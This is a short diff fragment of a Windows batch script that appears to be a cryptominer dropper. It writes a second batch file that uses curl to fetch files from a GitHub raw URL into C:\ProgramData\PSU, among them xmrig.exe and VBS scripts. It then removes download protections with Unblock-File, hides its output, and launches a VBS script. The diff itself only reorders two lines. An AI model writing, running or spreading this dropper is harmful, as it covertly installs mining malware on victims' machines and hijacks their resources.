@@ -46,11 +46,11 @@ echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/smb.tx
 echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs">> "C:\ProgramData\word.bat"
 echo curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe">> "C:\ProgramData\word.bat"
 echo timeout 0>> "C:\ProgramData\word.bat"
+echo start "" "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
+echo exit>> "C:\ProgramData\word.bat"
 powershell.exe Unblock-File -Path "*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\*" >> nul
 powershell.exe Unblock-File -Path "C:\ProgramData\PSU\*"
-echo start "" "C:\ProgramData\world.vbs">> "C:\ProgramData\word.bat"
-echo exit>> "C:\ProgramData\word.bat"
 start "" "C:\ProgramData\world.vbs"
 timeout 0 >> nul
 exit >> nul
